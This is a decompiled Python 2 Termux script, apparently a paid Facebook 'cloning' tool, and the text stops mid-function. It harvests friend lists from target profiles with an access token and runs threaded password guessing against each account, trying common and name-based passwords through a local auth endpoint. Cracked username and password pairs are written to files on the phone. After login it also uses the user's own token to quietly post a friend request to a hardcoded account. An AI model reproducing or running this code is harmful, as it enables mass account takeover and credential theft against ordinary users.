# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <www.youtube.com/c/pythonlife
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests, uuid, string
from multiprocessing.pool import ThreadPool
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

try:
    os.mkdir('/sdcard/ids/ex_ids')
except OSError:
    pass

os.system('termux-setup-storage')
os.system('git pull')
from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')

def logo():
    os.system('echo -e "\n\n\x0a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\x0a\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\x0a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\x0a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\x0a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\x0a\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\x0a\xe2\x95\xad\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\xb3\xe2\x94\xb3\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\x81\xe2\x94\xb3\xe2\x94\x81\xe2\x94\xb3\xe2\x95\xae\x0a\xe2\x94\x83\xe2\x94\x81\xe2\x94\x81\xe2\x94\xab\xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x95\xae\xe2\x95\xad\xe2\x94\xab\xe2\x95\xad\xe2\x95\xae\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\x0a\xe2\x94\xa3\xe2\x94\x81\xe2\x94\x81\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x95\xb0\xe2\x94\xab\xe2\x94\x83\xe2\x94\x83\xe2\x94\xa3\xe2\x94\xab\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\xe2\x94\x83\x0a\xe2\x95\xb0\xe2\x94\x81\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\xbb\xe2\x94\x81\xe2\x94\xbb\xe2\x95\xaf\xe2\x95\xb0\xe2\x95\xaf\xe2\x95\xb0\xe2\x94\xbb\xe2\x94\xbb\xe2\x94\x81\xe2\x95\xaf\n\n\n-----------------------------------------------\n\n\xe2\x9e\xa3UPDATE CMD   : FOR FREE  \n\xe2\x9e\xa3CYBER NAME   : Meer-Sultan \n\xe2\x9e\xa3WHATSAPP NO  : +923113628442\n\xe2\x9e\xa3COMMAMD TYPE : LOGIN WITH TOKEN\n\xe2\x9e\xa3NEW UPDATE   : TOKEN EXPIRING PROBLEM CLEAR \n\xe2\x9e\xa3NOTE         : USE 4GB YA 6GB RAM MOBILE \n\xe2\x9e\xa3WARNING      : DON,T CALL ME ONLY TEXT \n\xe2\x9e\xa3NOTE         : 1ST CLEAR TERMUX MEMORY DATA \n\xe2\x9e\xa3TOOL NAME    : Free FILE CLONING\n\n-----------------------------------------------" | lolcat')


def logo1():
    os.system('echo -e "\n\n(1) Login With id/pass \n\n(2) Login With Token" | lolcat')


def logo2():
    os.system('echo -e "\n\n(1) Auto Pass Cracking (7 pass)\n\n(2) Choice Pass Cracking (7pass)\n\n(3) Target Cloning (Coming soon) \n\n(4) Dump 100069, 100070, 100071,100072 Id only " | lolcat')


def logo3():
    os.system('echo -e "\n\n(1) Public Friendlist Crack  \n\n(2) File Cracking (100%)\n\n(0) Close Program" | lolcat')


def logo4():
    os.system('echo -e "\n\n(1) Public Friendlist Crack  \n\n(2) File Cracking (100%)\n\n(0) Close Program" | lolcat')


idh = []
back = 0

def reg():
    os.system('clear')
    logo()
    print ''
    os.system('echo -e "\n\n\xe2\x8b\x9f The Approval For Login" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Buy This Tool And Enjoy " | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Checking approval...." | lolcat')
    time.sleep(1)
    try:
        to = open('/sdcard/.serVer.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/Mr-Khoso/SPRO/main/.server.txt').text
    if to in r:
        os.system('cd meer && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd meer && node index.js &')
        time.sleep(5)
        g()
    else:
        os.system('clear')
        logo()
        print ''
        os.system('echo -e "\n\n\xe2\x8b\x9f  Approved Failed" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Your key is Not Approved" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f  Copy The id and send to Tool owner" | lolcat')
        os.system('echo -e "\n\n\xe2\x8b\x9f The Approval For Login" | lolcat')
        print '\x1b[0;31m\xe2\x8b\x9f \x1b[1;92mYour id: \x1b[0;36m' + to
        raw_input('\x1b[0;31m\xe2\x8b\x9f\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923113628442')
        reg()


def reg2():
    os.system('clear')
    logo()
    os.system('echo -e "\n\n\xe2\x8b\x9f Approval not detected" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Copy Your Key and Press Enter" | lolcat')
    os.system('echo -e "\n\n\xe2\x8b\x9f Select Whatsaap To Countinue" | lolcat')
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923113628442')
    sav = open('/sdcard/.sulserver.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def g():
    os.system('clear')
    logo()
    print '\x1b[1;91mTool Verification'
    print
    ip = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Your-ip :  ')
    if ip == 'a':
        os.system('clear')
        logo()
        print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
        ss = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Tool-ip : ')
        if ss == 'a':
            os.system('clear')
            logo()
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Your-ip : (Confirmed)'
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Tool-ip : (Confirmed)'
            time.sleep(1)
            print ''
            print '\x1b[1;92m \xe2\x9c\x93 \x1b[1;95m All Set'
            time.sleep(1)
            login_choice()
        else:
            print '[!] Tool-ip : ' + ss + ' (Wrong)'
            time.sleep(1)
            g()
    else:
        print '[!] Tool-ip : ' + ip + ' (Wrong)'
        time.sleep(1)
        g()


def login_choice():
    os.system('clear')
    try:
        open('.login.txt', 'r')
        menu()
    except IOError:
        os.system('clear')
        logo()
        print
        os.system('echo -e "<>LOGIN MENU<>" | lolcat')
        logo1()
        print ''
        login_select()


def login_select():
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab \x1b[0;97m')
    if select == '2':
        login_token()
    elif select == '1':
        login_fb()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        time.sleep(1)
        login_select()


def login_fb():
    os.system('clear')
    logo()
    print
    print '   \x1b[101m\x1b[37;1mLOGIN Fb-ID\x1b[0m'
    print
    id = raw_input(' Id/mail/number: ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input(' Password: ')
    print ''
    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd, headers=header).text
    q = json.loads(data)
    if 'loc' in q:
        hamza = open('.login.txt', 'w')
        hamza.write(q['loc'])
        hamza.close()
        requests.post('https://graph.facebook.com/me/friends?uid=100068398876177&access_token=' + q['loc'])
        menu()
    elif 'www.facebook.com' in q['error']:
        print ''
        print '\t    \x1b[1;31mUser must verify account before login\x1b[0;97m'
        time.sleep(1)
        print ''
        raw_input('\tPress enter to back ')
        login_choice()
    else:
        print ''
        print '\t    \x1b[1;31mIncorrect credentials\x1b[0;97m'
        raw_input('Press enter to try again ')
        login_choice()


def login_token():
    os.system('clear')
    try:
        open('.login.txt', 'r')
        time.sleep(1)
        menu()
    except (KeyError, IOError):
        os.system('clear')
        logo()
        print
        print '   \x1b[101m\x1b[37;1mLOGIN FB-TOKEN\x1b[0m'
        print
        token = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Paste token : ')
        token_save = open('.login.txt', 'w')
        token_save.write(token)
        token_save.close()
        time.sleep(1)
        menu()


def menu():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print ''
        logo()
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        a = json.loads(r.text)
        name = a['name']
    except KeyError:
        os.system('clear')
        print ''
        logo()
        print ''
        print '\t    \x1b[1;31mToken expired\x1b[0;97m'
        time.sleep(1)
        os.system('rm -rf .login.txt')
        login_choice()

    os.system('clear')
    logo()
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    print '\t\x1b[1;33mWellCome to token id user: ' + name + '\x1b[0;97m'
    print 47 * '\x1b[1;91m\xe2\x95\x90'
    logo2()
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[1;92m\xe2\x80\xa2\xe2\x89\xab\x1b[0;97m ')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '4':
        ex_id()
    elif select == '3':
        os.system('python2 SPROpy')
    elif select == '5':
        full()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print
    print '\t  \x1b[101m\x1b[37;1mAUTO PASS CLONING\x1b[0m'
    print
    logo4()
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[1;33m\xe2\x80\xa2\xe2\x89\xab\x1b[0;97m ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t    \x1b[1;32mAUTO PASS PUBLIC CRACK\x1b[0;97m'
        print ''
        idt = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) User id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) User Name : ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        logo()
        print ''
        print '\t    \x1b[1;32mAUTO PASS FILE CRACK\x1b[0;97m'
        print ''
        try:
            filelist = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Paste File : ')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mRequested file not found\x1b[0;97m'
            print ''
            raw_input(' Press enter to back ')
            crack()

    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        crack_select()
    print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Total Account : ' + str(len(id))
    print 47 * '\xe2\x95\x90'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = '123456'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;31m(\x1b[105m\x1b[37;1mSULTAN-BALOCH-OK\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass1 + '\x1b[1;92m'
                ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[0;33m(SULTAN-BALOCH-CP) ' + uid + ' | ' + pass1
                cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + '123'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;31m(\x1b[105m\x1b[37;1mSULTAN-BALOCH-OK\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass2 + '\x1b[1;92m'
                    ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[0;33m(SULTAN-BALOCH-CP) ' + uid + ' | ' + pass2
                    cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name + '1234'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;31m(\x1b[105m\x1b[37;1mSULTAN-BALOCH-OK\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass3 + '\x1b[1;92m'
                        ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[0;33m(SULTAN-BALOCH-CP) ' + uid + ' | ' + pass3
                        cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name + '12345'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;31m(\x1b[105m\x1b[37;1mSULTAN-BALOCH-OK\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass4 + '\x1b[1;92m'
                            ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[0;33m(SULTAN-BALOCH-CP) ' + uid + ' | ' + pass4
                            cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = name + '786'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;31m(\x1b[105m\x1b[37;1mSULTAN-BALOCH-OK\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass5 + '\x1b[1;92m'
                                ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[0;33m(SULTAN-BALOCH-CP) ' + uid + ' | ' + pass5
                                cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass6)
                            else:
                                pass6 = '786786'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;31m(\x1b[105m\x1b[37;1mSULTAN-BALOCH-OK\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass6 + '\x1b[1;92m'
                                    ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[0;33m(SULTAN-BALOCH-CP) ' + uid + ' | ' + pass6
                                    cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = '102030'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;31m(\x1b[105m\x1b[37;1mSULTAN-BALOCH-OK\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass7 + '\x1b[1;92m'
                                        ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[0;33m(SULTAN-BALOCH-CP) ' + uid + ' | ' + pass7
                                        cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print 47 * '-'
    print ''
    print ' \x1b[0;37mThe process has completed'
    print ' \x1b[0;33mAuto Password Result'
    print ' \x1b[0;37mRESULT :\x1b[0;33m OK : ' + str(len(oks)) + ' \x1b[0;37mCP : ' + str(len(cps))
    print ''
    print 47 * '-'
    print ''
    raw_input(' Press enter to back')
    crack()


def ex_id():
    global token
    idg = []
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        print ''
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print 47 * '\x1b[1;97m\xe2\x95\x90'
    print '\t  \x1b[1;32mCOLLECT PUBLIC ID FRIENDLIST\x1b[0;97m'
    print 47 * '\x1b[1;97m\xe2\x95\x90'
    idh = raw_input('\x1b[1;93m(\x1b[1;91m+\x1b[1;97m) Input Id: ')
    try:
        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
        q = json.loads(r.text)
        print '\x1b[1;95m(\x1b[1;91m\xe2\x9c\x93\x1b[1;92m) Collecting from: ' + q['name']
    except KeyError:
        print ''
        print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
        print ''
        raw_input(' Press enter to back')
        crack()

    r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
    q = json.loads(r.text)
    ids = open('friends.txt', 'w')
    for i in q['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        idg.append(uid + '|' + nm)
        ids.write(uid + '|' + nm + '\n')

    ids.close()
    print ''
    print 47 * '-'
    print ''
    print ' The process has completed'
    print ' Total ids: ' + str(len(idg))
    print ''
    print 47 * '-'
    print ''
    os.system("cat friends.txt | grep '100072' >> /sdcard/friends.txt")
    os.system("cat friends.txt | grep '100071' >> /sdcard/friends.txt")
    os.system("cat friends.txt | grep '100070' >> /sdcard/friends.txt")
    os.system("cat friends.txt | grep '100069' >> /sdcard/friends.txt")
    raw_input(' Press enter to download file')
    os.system('rm -rf friends.txt')
    print ' File downloaded successfully'
    time.sleep(1)
    print '\x1b[1;93mSaved /sdcard/-paid1000.friends.txt'
    print '\x1b[1;93mEnter Go Back'
    menu()


def choice():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print ''
        print '\t    \x1b[1;31mToken not found\x1b[0;97m'
        time.sleep(1)
        login_choice()

    os.system('clear')
    logo()
    print
    print '\t \x1b[101m\x1b[37;1mCHOICE PASS CRACK MENU\x1b[0m'
    print
    logo3()
    print ''
    choice_select()


def choice_select():
    select = raw_input('\x1b[1;32m>>> \x1b[0;97m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        logo()
        print ''
        print '\t    \x1b[1;32mCHOICE NAME PASS CRACK\x1b[0;97m'
        p1 = raw_input('\x1b[1;97m(\x1b[1;91m1\x1b[1;92m) Name + Digit : ')
        p2 = raw_input('\x1b[1;97m(\x1b[1;91m2\x1b[1;93m) Name + Digit : ')
        p3 = raw_input('\x1b[1;97m(\x1b[1;91m2\x1b[1;95m) Name + Digit : ')
        p4 = raw_input('\x1b[1;97m(\x1b[1;91m3\x1b[1;96m) Name + Digit : ')
        print
        print '\t    \x1b[1;32mCHOICE DIGIT PASS CRACK\x1b[0;97m'
        print 47 * '\x1b[1;91m\xe2\x95\x90'
        pass5 = raw_input('\x1b[1;97m(\x1b[1;91m5\x1b[1;92m) Digit Password : ')
        pass6 = raw_input('\x1b[1;97m(\x1b[1;91m6\x1b[1;93m) Digit Password : ')
        pass7 = raw_input('\x1b[1;97m(\x1b[1;91m7\x1b[1;95m) Digit Password : ')
        print
        print '\t    \x1b[1;32mAUTO PASS PUBLIC CRACK\x1b[0;97m'
        print ''
        idt = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) User id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) User id : ' + q['name']
        except KeyError:
            print '\t    \x1b[1;31mLogged in id has checkpoint\x1b[0;97m'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        logo()
        print
        print '\t    \x1b[1;32mCHOICE NAME PASS CRACK\x1b[0;97m'
        print 47 * '\x1b[1;91m\xe2\x95\x90'
        p1 = raw_input('\x1b[1;97m(\x1b[1;91m1\x1b[1;92m) Name + Digit : ')
        p2 = raw_input('\x1b[1;97m(\x1b[1;91m2\x1b[1;93m) Name + Digit : ')
        p3 = raw_input('\x1b[1;97m(\x1b[1;91m3\x1b[1;95m) Name + Digit : ')
        p4 = raw_input('\x1b[1;97m(\x1b[1;91m4\x1b[1;96m) Name + Digit : ')
        print
        print '\t    \x1b[1;32mCHOICE DIGIT PASS CRACK\x1b[0;97m'
        print 47 * '\x1b[1;91m\xe2\x95\x90'
        pass5 = raw_input('\x1b[1;97m(\x1b[1;91m5\x1b[1;92m) Digit Password : ')
        pass6 = raw_input('\x1b[1;97m(\x1b[1;91m6\x1b[1;93m) Digit Password : ')
        pass7 = raw_input('\x1b[1;97m(\x1b[1;91m7\x1b[1;95m) Digit Password : ')
        print ''
        print '\t    \x1b[1;32mAUTO PASS FILE CRACK\x1b[0;97m'
        print ''
        try:
            filelist = raw_input('\x1b[1;97m(\x1b[1;91m+\x1b[1;97m) Paste File : ')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())

        except (KeyError, IOError):
            print ''
            print '\t    \x1b[1;31mRequested file not found\x1b[0;97m'
            print ''
            raw_input(' Press enter to back ')
            menu()

    elif select == '0':
        menu()
    else:
        print ''
        print '\t    \x1b[1;31mSelect valid option\x1b[0;97m'
        print ''
        choice_select()
    print '\x1b[1;97m(\x1b[1;93m\xe2\x9c\x93\x1b[1;97m) Total Account : ' + str(len(id))
    print 47 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;34m(\x1b[1;31mSULTAN\x1b[1;33m-\x1b[1;32mBALOCH\x1b[1;33m-\x1b[105m\x1b[37;1mOK\x1b[0m\x1b[1;34m) ' + uid + ' | ' + pass1 + '\x1b[1;93m'
                ok = open('/sdcard/ids/paid1000-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31m(\x1b[1;32mSULTAN\x1b[1;33m-\x1b[1;36mBALOCH\x1b[1;34m-\x1b[102m\x1b[37;1mCP\x1b[0m\x1b[1;31m) ' + uid + ' | ' + pass1 + '\x1b[1;92m'
                cp = open('/sdcard/ids/paid1000-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
